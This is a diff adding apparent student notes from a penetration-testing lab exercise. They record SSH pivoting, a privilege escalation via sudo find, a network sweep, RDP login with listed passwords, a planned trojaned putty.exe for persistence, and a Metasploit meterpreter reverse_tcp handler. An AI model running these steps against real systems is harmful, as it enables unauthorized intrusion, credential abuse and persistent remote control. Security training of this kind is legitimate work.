@@ -108,7 +108,89 @@ user3 - Bob4THEEapples
 Lee_Roth - Lroth - anotherpassword4THEages
 on .181 webapp
 
+`student@lin-ops:~$ ssh -S /tmp/red red -O forward -L 1602:192.168.28.181:22`
+`student@lin-ops:~$ ssh -S /tmp/red red -O forward -L 1603:192.168.28.172:22`
+ now lets try to brute force pwds
+ 
+none seem to work on the .181
+Aaron works on .172bash
+
+`student@lin-ops:~$ ssh -MS /tmp/blue Aaron@0.0.0.0 -p 1603`
+`student@lin-ops:~$ ssh Aaron@0.0.0.0 -p 1603`
+`Aaron@RoundSensor:/$ cat /etc/crontab`
+see weird crontabs
+
+sudo -l
+    (ALL) NOPASSWD: /usr/bin/find
+[use the ntfo](https://gtfobins.github.io/#)https://gtfobins.github.io/#
+use website 
+Find sudo command
+Aaron@RoundSensor:/$ find . -exec /bin/sh \; -quit
+whoami >>> root
+ls -lisa /root
+cat the files
+see a nc listener set up tried to call it 
+`user2@PublicFacingWebsite:/$ nc 192.168.28.172 7008`
+nothing..
+
+`student@lin-ops:~$ ssh -S /tmp/red red -O cancel -D9050`
+`student@lin-ops:~$ ssh -S /tmp/blue blue -O forward -D9050`
+`# bash`
+`root@RoundSensor:/root# `
+
+`root@RoundSensor:/root# for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done`
+64 bytes from 192.168.28.172: icmp_seq=1 ttl=64 time=0.039 ms
+64 bytes from 192.168.28.179: icmp_seq=1 ttl=128 time=1.57 ms
+64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.989 ms (ignore)
+
+`student@lin-ops:~$ proxychains nmap -T4 -Pn -sT -v 192.168.28.179`
+PORT     STATE SERVICE
+22/tcp   open  ssh
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+9999/tcp open  abyss
+
+know its a windows box bc of all these ports
+`student@lin-ops:~$ proxychains nc 192.168.28.179 9999`
+secure server
+this is the only program we did the buffer overflow exploit
+
+`student@lin-ops:~$ ssh -S /tmp/blue blue -O forward -L 1604:192.168.28.179:3389`
+`student@lin-ops:~$ ssh -S /tmp/blue blue -O forward -L 1605:192.168.28.179:9999`
+
+student@lin-ops:~$ xfreerdp /u:Lroth /v:0.0.0.0:1604 /p:anotherpassword4THEages -dynamic-resolution +glyph-cache +clipboard
+
+on windows box
+open up cmd 
+netstat -ano
+tasklist /svc (find pid for secure server)
+tasklist /svc | findstr /i "secure"
+netstat -ano | findstr "3064"
+secure server listening on 9999
+open up services
+see secure server
+open task scheduler
+see trigger , actions go to directory
+lets make our own version putty.exe bc can add stuff in directory
+open regedit
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and RunOnce 
+
+lets go Putty route
+
+linops:
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > exploit
+student@lin-ops:~/Desktop/Security$ ./secureserverBuffo2.py 
 
 
+dont need cookiestealer
+review linux and windows buffer overflow
+run msfvenom using 0.0.0.0 bc that what we used in 
 
 
